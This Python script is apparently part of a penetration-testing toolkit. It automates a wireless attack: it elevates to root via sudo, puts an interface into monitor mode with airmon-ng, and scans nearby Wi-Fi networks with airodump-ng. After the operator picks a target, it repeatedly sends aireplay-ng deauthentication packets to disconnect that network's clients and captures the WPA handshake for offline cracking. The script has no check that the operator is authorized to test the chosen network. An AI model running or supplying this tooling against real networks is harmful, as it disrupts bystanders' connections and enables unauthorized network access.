#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import re
import json
import threading
import signal
import shutil  # Added import
from pathlib import Path

# Define basic color constants before using them
YELLOW = '\033[93m'
RESET = '\033[0m'

# Check for root privileges at the very beginning
if os.geteuid() != 0:
    # Get the absolute path of the script
    script_path = os.path.abspath(__file__)
    # Re-run the script with sudo
    print(f"{YELLOW}[!] Root privileges required. Attempting to re-run with sudo...{RESET}")
    args = ['sudo', sys.executable, script_path] + sys.argv[1:]
    os.execv(args[0], args)

# Color definitions
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WirelessRecon:
    def __init__(self, target):
        self.target = target  # This would be the wireless interface (e.g., wlan0)
        self.output_base = "/tmp/VirexCore"
        self.output_dir = self._create_output_dir(target)
        self.monitor_interface = None
        self.wifi_networks = []
        
        # Set Python cache prefix to target-specific directory
        sys.pycache_prefix = self.output_dir
        
        # Remove existing __pycache__ directories
        self._remove_pycache()
        
    def _create_output_dir(self, target):
        # Sanitize target for directory name
        safe_target = re.sub(r'[^\w\-_.]', '_', target)
        output_dir = os.path.join(self.output_base, safe_target)
        os.makedirs(output_dir, exist_ok=True)
        return output_dir
    
    def _remove_pycache(self):
        """Remove __pycache__ directories in the project folder"""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        for root, dirs, files in os.walk(script_dir):
            if '__pycache__' in dirs:
                pycache_path = os.path.join(root, '__pycache__')
                try:
                    shutil.rmtree(pycache_path)
                    print(f"{Colors.YELLOW}[+] Removed {pycache_path}{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Failed to remove {pycache_path}: {str(e)}{Colors.RESET}")
    
    def _handle_eof(self, signum, frame):
        """Handle Ctrl+D (EOF)"""
        print(f"\n{Colors.YELLOW}[!] EOF detected. Returning to reconnaissance menu...{Colors.RESET}")
        time.sleep(1)
        sys.exit(0)
    
    def _run_command_with_output(self, command, output_file, description=None, show_progress=True):
        """Run a command and display real-time output while saving full output to file"""
        if description:
            print(f"{Colors.CYAN}[+] {description}{Colors.RESET}")
        
        # Ensure output directory exists
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        # Save command to output file
        with open(output_file, 'a') as f:
            f.write(f"\n\n=== {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
            f.write(f"COMMAND: {command}\n")
            f.write(f"DESCRIPTION: {description}\n\n")
        
        # Run command and capture output
        process = subprocess.Popen(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,  # Line buffered
            universal_newlines=True
        )
        
        # Thread to read and display output
        def read_output():
            for line in iter(process.stdout.readline, ''):
                # Save to file
                with open(output_file, 'a') as f:
                    f.write(line)
                
                # Display in terminal (can be customized per tool)
                print(line.rstrip())
            process.stdout.close()
        
        # Start thread to read output
        output_thread = threading.Thread(target=read_output)
        output_thread.daemon = True
        output_thread.start()
        
        # Wait for process to complete
        return_code = process.wait()
        output_thread.join(timeout=1)  # Give thread time to finish
        
        return return_code == 0
    
    def _check_interface(self):
        """Check if the wireless interface exists"""
        try:
            result = subprocess.run(
                f"iwconfig {self.target}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            return result.returncode == 0 and 'IEEE 802.11' in result.stdout
        except:
            return False
    
    def _enable_monitor_mode(self):
        """Enable monitor mode on the wireless interface"""
        print(f"\n{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}[1/5] Enabling monitor mode...{Colors.RESET}")
        print(f"{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        
        # Stop any interfering processes
        airmon_kill_file = os.path.join(self.output_dir, "airmon_kill.txt")
        self._run_command_with_output(
            f"airmon-ng check kill",
            airmon_kill_file,
            "Stopping interfering processes"
        )
        
        # Enable monitor mode
        airmon_start_file = os.path.join(self.output_dir, "airmon_start.txt")
        try:
            result = subprocess.run(
                f"airmon-ng start {self.target}",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            with open(airmon_start_file, 'w') as f:
                f.write(f"COMMAND: airmon-ng start {self.target}\n\n")
                f.write(f"STDOUT:\n{result.stdout}\n")
                f.write(f"STDERR:\n{result.stderr}\n")
            
            # Extract monitor mode interface name
            monitor_pattern = rf'\({self.target}([^\)]+)\)'
            match = re.search(monitor_pattern, result.stdout)
            
            if match:
                self.monitor_interface = f"{self.target}{match.group(1)}"
                print(f"{Colors.GREEN}[+] Monitor mode enabled on {self.monitor_interface}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] Could not determine monitor interface name. Using original interface.{Colors.RESET}")
                self.monitor_interface = self.target
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to enable monitor mode: {str(e)}{Colors.RESET}")
            self.monitor_interface = self.target
    
    def _discover_networks(self):
        """Discover Wi-Fi networks"""
        print(f"\n{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}[2/5] Discovering Wi-Fi networks...{Colors.RESET}")
        print(f"{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        
        airodump_file = os.path.join(self.output_dir, "airodump.txt")
        
        print(f"{Colors.YELLOW}[+] Scanning for networks (15 seconds)...{Colors.RESET}")
        self._run_command_with_output(
            f"timeout 15 airodump-ng {self.monitor_interface} -w {os.path.join(self.output_dir, 'airodump')}",
            airodump_file,
            "Network discovery with airodump-ng",
            show_progress=False
        )
        
        # Parse the CSV output to extract networks
        airodump_csv = os.path.join(self.output_dir, "airodump-01.csv")
        if os.path.exists(airodump_csv):
            with open(airodump_csv, 'r') as f:
                airodump_data = f.read()
            
            # Extract networks
            lines = airodump_data.strip().split('\n')
            data_lines = [line for line in lines if line.strip() and not line.startswith('BSSID') and not line.startswith('Station')]
            
            for line in data_lines:
                parts = line.split(',')
                if len(parts) >= 10:
                    network = {
                        'bssid': parts[0],
                        'essid': parts[13] if len(parts) > 13 else '',
                        'channel': parts[3],
                        'encryption': parts[5],
                        'power': parts[8],
                        'wps': 'WPS' in parts[5]
                    }
                    
                    self.wifi_networks.append(network)
            
            if self.wifi_networks:
                print(f"{Colors.GREEN}[+] Found {len(self.wifi_networks)} wireless networks{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] No wireless networks found{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Could not read airodump output{Colors.RESET}")
    
    def _select_network(self):
        """Select a network for handshake capture"""
        print(f"\n{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}[3/5] Selecting a network...{Colors.RESET}")
        print(f"{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        
        if not self.wifi_networks:
            print(f"{Colors.RED}[!] No networks available for selection{Colors.RESET}")
            return None
        
        # Display networks
        print(f"{Colors.CYAN}Available networks:{Colors.RESET}")
        for i, network in enumerate(self.wifi_networks, 1):
            essid = network['essid'] if network['essid'] else 'Hidden'
            encryption = network['encryption']
            channel = network['channel']
            power = network['power']
            
            print(f"{Colors.YELLOW}{i}){Colors.RESET} {essid} ({encryption}) - Channel: {channel}, Power: {power}dB")
        
        # Get user selection
        while True:
            try:
                print(f"\n{Colors.CYAN}[+] Select a network (1-{len(self.wifi_networks)}): {Colors.RESET}", end="")
                choice = int(input().strip())
                
                if 1 <= choice <= len(self.wifi_networks):
                    selected_network = self.wifi_networks[choice - 1]
                    essid = selected_network['essid'] if selected_network['essid'] else 'Hidden'
                    print(f"{Colors.GREEN}[+] Selected network: {essid}{Colors.RESET}")
                    return selected_network
                else:
                    print(f"{Colors.RED}[!] Invalid choice. Please try again.{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[!] Please enter a valid number.{Colors.RESET}")
            except EOFError:
                # Handle Ctrl+D
                print(f"\n{Colors.YELLOW}[!] EOF detected. Returning to reconnaissance menu...{Colors.RESET}")
                time.sleep(1)
                sys.exit(0)
    
    def _capture_handshake(self, network):
        """Capture handshake for the selected network"""
        print(f"\n{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}[4/5] Capturing handshake...{Colors.RESET}")
        print(f"{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        
        essid = network['essid'] if network['essid'] else 'Hidden'
        bssid = network['bssid']
        channel = network['channel']
        
        print(f"{Colors.YELLOW}[+] Target network: {essid} ({bssid}){Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Channel: {channel}{Colors.RESET}")
        
        # Start airodump-ng to capture handshake
        handshake_file = os.path.join(self.output_dir, "handshake")
        capture_file = f"{handshake_file}-{essid.replace(' ', '_')}"
        
        # Start airodump-ng in background
        airodump_cmd = f"airodump-ng {self.monitor_interface} -c {channel} --bssid {bssid} -w {capture_file}"
        airodump_process = subprocess.Popen(
            airodump_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"{Colors.YELLOW}[+] Waiting for handshake (30 seconds)...{Colors.RESET}")
        
        # Try to capture handshake for 30 seconds
        for i in range(30):
            # Check if handshake is captured
            handshake_files = [f for f in os.listdir(self.output_dir) if f.startswith(f"handshake-{essid.replace(' ', '_')}-") and f.endswith('.cap')]
            
            if handshake_files:
                print(f"{Colors.GREEN}[+] Handshake captured!{Colors.RESET}")
                airodump_process.terminate()
                return os.path.join(self.output_dir, handshake_files[0])
            
            # Deauthenticate clients to force reconnection
            if i % 5 == 0:  # Send deauth every 5 seconds
                deauth_cmd = f"aireplay-ng --deauth 5 -a {bssid} {self.monitor_interface}"
                subprocess.run(deauth_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                print(f"{Colors.YELLOW}[+] Sent deauthentication packets{Colors.RESET}")
            
            time.sleep(1)
        
        # If we reach here, handshake was not captured
        airodump_process.terminate()
        print(f"{Colors.RED}[!] Handshake not captured{Colors.RESET}")
        return None
    
    def _disable_monitor_mode(self):
        """Disable monitor mode on the wireless interface"""
        print(f"\n{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}[5/5] Disabling monitor mode...{Colors.RESET}")
        print(f"{Colors.YELLOW}{'═' * 80}{Colors.RESET}")
        
        airmon_stop_file = os.path.join(self.output_dir, "airmon_stop.txt")
        self._run_command_with_output(
            f"airmon-ng stop {self.monitor_interface}",
            airmon_stop_file,
            "Disabling monitor mode"
        )
        
        # Restart network services
        print(f"{Colors.YELLOW}[+] Restarting network services...{Colors.RESET}")
        subprocess.run("systemctl restart NetworkManager", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{Colors.GREEN}[+] Network services restarted{Colors.RESET}")
    
    def _generate_summary(self, handshake_file=None):
        """Generate a clean summary of wireless reconnaissance findings"""
        print(f"\n{Colors.MAGENTA}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.MAGENTA}                   WIRELESS RECONNAISSANCE SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'═' * 80}{Colors.RESET}")
        print(f"{Colors.CYAN}Target: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'═' * 80}{Colors.RESET}")
        
        # Display discovered networks
        if self.wifi_networks:
            print(f"{Colors.YELLOW}[+] Wireless Networks Discovered:{Colors.RESET} {len(self.wifi_networks)} networks")
            
            # Count networks by encryption type
            open_networks = [net for net in self.wifi_networks if net['encryption'] == 'OPN']
            wep_networks = [net for net in self.wifi_networks if net['encryption'] == 'WEP']
            wpa_networks = [net for net in self.wifi_networks if 'WPA' in net['encryption']]
            wps_networks = [net for net in self.wifi_networks if net.get('wps')]
            
            if open_networks:
                print(f"{Colors.RED}[!] Open Networks:{Colors.RESET} {len(open_networks)} found")
            if wep_networks:
                print(f"{Colors.RED}[!] WEP Networks:{Colors.RESET} {len(wep_networks)} found")
            if wpa_networks:
                print(f"{Colors.YELLOW}[+] WPA Networks:{Colors.RESET} {len(wpa_networks)} found")
            if wps_networks:
                print(f"{Colors.YELLOW}[+] WPS Networks:{Colors.RESET} {len(wps_networks)} found")
        else:
            print(f"{Colors.RED}[!] No wireless networks found{Colors.RESET}")
        
        # Display handshake capture result
        if handshake_file:
            print(f"{Colors.GREEN}[+] Handshake Captured:{Colors.RESET} {handshake_file}")
        else:
            print(f"{Colors.RED}[!] Handshake not captured{Colors.RESET}")
        
        print(f"{Colors.MAGENTA}{'═' * 80}{Colors.RESET}")
    
    def run(self):
        """Execute wireless reconnaissance with comprehensive tools"""
        # Set up signal handler for EOF (Ctrl+D)
        signal.signal(signal.SIGINT, self._handle_eof)
        
        print(f"{Colors.CYAN}[+] Output will be saved in: {self.output_dir}{Colors.RESET}")
        
        # Check if the interface exists
        if not self._check_interface():
            print(f"{Colors.RED}[!] Interface {self.target} does not exist or is not a wireless interface.{Colors.RESET}")
            
            # Wait for user input before returning
            try:
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
            except EOFError:
                # Handle Ctrl+D
                print(f"\n{Colors.YELLOW}[!] EOF detected. Returning to reconnaissance menu...{Colors.RESET}")
                time.sleep(1)
                sys.exit(0)
            return
        
        # Enable monitor mode
        self._enable_monitor_mode()
        
        try:
            # Discover networks
            self._discover_networks()
            
            # Select a network
            selected_network = self._select_network()
            
            # Capture handshake if a network was selected
            handshake_file = None
            if selected_network:
                handshake_file = self._capture_handshake(selected_network)
            
            # Generate summary
            self._generate_summary(handshake_file)
            
        finally:
            # Disable monitor mode
            self._disable_monitor_mode()
        
        print(f"\n{Colors.GREEN}[✓] Wireless reconnaissance completed successfully!{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Full results saved to: {self.output_dir}{Colors.RESET}")
        
        # Wait for user input before returning
        try:
            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
        except EOFError:
            # Handle Ctrl+D
            print(f"\n{Colors.YELLOW}[!] EOF detected. Returning to reconnaissance menu...{Colors.RESET}")
            time.sleep(1)
            sys.exit(0)

if __name__ == "__main__":
    try:
        target = sys.argv[1] if len(sys.argv) > 1 else ""
        if not target:
            print(f"{Colors.RED}[!] No target provided{Colors.RESET}")
            sys.exit(1)
            
        recon = WirelessRecon(target)
        recon.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.CYAN}Operation cancelled by user. Returning to reconnaissance menu...{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}An unexpected error occurred: {str(e)}{Colors.RESET}")
        sys.exit(1)